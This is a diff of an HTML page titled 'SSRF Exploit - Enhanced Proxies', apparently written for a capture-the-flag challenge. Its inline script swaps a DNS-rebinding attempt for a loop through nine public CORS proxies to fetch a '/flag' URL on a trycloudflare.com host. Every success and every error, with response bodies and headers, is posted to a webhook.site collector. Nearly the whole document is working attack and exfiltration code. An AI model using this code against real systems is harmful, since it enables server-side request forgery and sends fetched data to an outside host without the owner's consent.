@@ -1,35 +1,82 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SSRF - DNS Rebinding</title>
+    <title>SSRF Exploit - Enhanced Proxies</title>
 </head>
 <body>
     <script>
-        async function dnsRebindingAttack() {
-            // Try services that might allow DNS rebinding
-            const rebindingServices = [
-                'https://rbndr.us/api/resolve?host=',
-                'https://lock.cmpxchg8b.com/rebinder.html?ip='
+        async function exploitWithFreshProxies() {
+            // Fresh list of CORS proxies (November 2025)
+            const proxies = [
+                'https://corsproxy.org/?',
+                'https://api.allorigins.win/raw?url=',
+                'https://thingproxy.freeboard.io/fetch/',
+                'https://cors-anywhere.herokuapp.com/',
+                'https://cors.bridged.cc/',
+                'https://proxy.cors.sh/',
+                'https://noki-cors.herokuapp.com/',
+                'https://cors.eu.org/',
+                'https://crossorigin.me/'
             ];
             
-            const target = 'tar-award-writers-controllers.trycloudflare.com';
+            const targetUrl = 'https://tar-award-writers-controllers.trycloudflare.com/flag';
             
-            for (let service of rebindingServices) {
+            for (let proxy of proxies) {
                 try {
-                    const response = await fetch(service + target);
-                    const result = await response.text();
+                    console.log('Trying proxy:', proxy);
                     
-                    await fetch('https://webhook.site/14bfd72c-dceb-4a62-ae62-420272ae86f0/temp1', {
-                        method: 'POST',
-                        body: `Rebinding ${service}: ${result}`
+                    // Different encoding approaches
+                    const encodedUrl = encodeURIComponent(targetUrl);
+                    const fullUrl = proxy + (proxy.includes('?') ? encodedUrl : targetUrl);
+                    
+                    const response = await fetch(fullUrl, {
+                        method: 'GET',
+                        headers: {
+                            'Accept': '*/*',
+                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                            'Origin': 'https://example.com',
+                            'Referer': 'https://example.com/'
+                        },
+                        mode: 'cors'
                     });
+                    
+                    if (response.ok) {
+                        const text = await response.text();
+                        console.log('SUCCESS with proxy:', proxy, text);
+                        
+                        // Send detailed info to webhook
+                        await fetch('https://webhook.site/14bfd72c-dceb-4a62-ae62-420272ae86f0', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                success: true,
+                                proxy: proxy,
+                                status: response.status,
+                                body: text,
+                                headers: Object.fromEntries(response.headers)
+                            })
+                        });
+                        return true;
+                    }
                 } catch (e) {
-                    console.log('Rebinding failed:', service);
+                    console.log('Proxy failed:', proxy, e.message);
+                    
+                    // Send error to webhook
+                    await fetch('https://webhook.site/14bfd72c-dceb-4a62-ae62-420272ae86f0', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            error: true,
+                            proxy: proxy,
+                            errorMessage: e.message
+                        })
+                    });
                 }
             }
+            return false;
         }
         
-        dnsRebindingAttack();
+        exploitWithFreshProxies();
     </script>
 </body>
 </html>
